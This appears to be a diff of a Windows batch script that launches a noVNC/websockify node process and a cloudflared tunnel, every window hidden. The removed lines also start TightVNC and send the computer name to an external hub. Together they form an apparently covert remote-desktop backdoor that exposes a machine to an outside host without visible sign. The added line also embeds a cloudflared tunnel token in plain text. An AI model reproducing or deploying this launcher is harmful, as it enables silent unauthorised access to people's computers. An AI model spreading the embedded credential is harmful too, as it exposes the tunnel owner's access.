@@ -1,40 +1,11 @@
 @echo off
-:: -------------------------------
-:: Windows VNC Client Connector – sequential ID
-:: Works from any directory
-:: -------------------------------
+set "NO_VNC_DIR=C:\ProgramData\server\noVnc"
 
-:: Get the directory where this batch file resides
-set "SCRIPT_DIR=%~dp0"
-:: Remove trailing backslash if needed
-set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
+:: Run node hidden
+powershell -WindowStyle Hidden -Command "Start-Process node -ArgumentList 'config.js' -WorkingDirectory '%NO_VNC_DIR%' -WindowStyle Hidden"
 
-:: Set paths relative to the batch file
-set "NO_VNC_DIR=%SCRIPT_DIR%\noVnc"
-set "HUB_URL=vnc.qikseek.qzz.io"
-set "ID_FILE=%NO_VNC_DIR%\last_id.txt"
-
-:: Determine next sequential ID
-if exist "%ID_FILE%" (
-    set /p LAST_ID=<"%ID_FILE%"
-    set /a REPEATER_ID=LAST_ID+1
-) else (
-    set REPEATER_ID=1
-)
-
-echo %REPEATER_ID% > "%ID_FILE%"
-echo Connecting with repeater ID: %REPEATER_ID%
-
-:: Start TightVNC hidden
-start "" "C:\Program Files\TightVNC\tvnserver.exe"
+:: Wait 5 seconds
 timeout /t 5 /nobreak >nul
 
-:: Run websockify client hidden
-powershell -WindowStyle Hidden -Command ^
-  "Start-Process node -ArgumentList 'config.js --repeater=%REPEATER_ID%' -WorkingDirectory '%NO_VNC_DIR%' -WindowStyle Hidden"
-
-timeout /t 5 /nobreak >nul
-
-:: Connect to hub automatically with correct sequential ID
-powershell -WindowStyle Hidden -Command ^
-  "Start-Process cloudflared -ArgumentList 'tunnel --url http://%HUB_URL%:8080?repeater=%REPEATER_ID%&name=%COMPUTERNAME% --no-autoupdate' -WindowStyle Hidden"
+:: Run cloudflared tunnel hidden
+powershell -WindowStyle Hidden -Command "Start-Process cloudflared -ArgumentList 'tunnel run --token eyJhIjoiMzJkOThkNTA1ZmI1OTE4ODhiNjAzYWU1Y2EyYzFiNjUiLCJzIjoiTVdKa01qVmlOREl0TW1KbE1pMDBPVFF5TFdGaFltVXRNVFZtT0Rka01XVXdNalF6IiwidCI6IjJkMjRjMThmLTg5NTQtNGM4Yy05YTVkLWNjMzIxYTNkZjRmZCJ9' -WindowStyle Hidden"
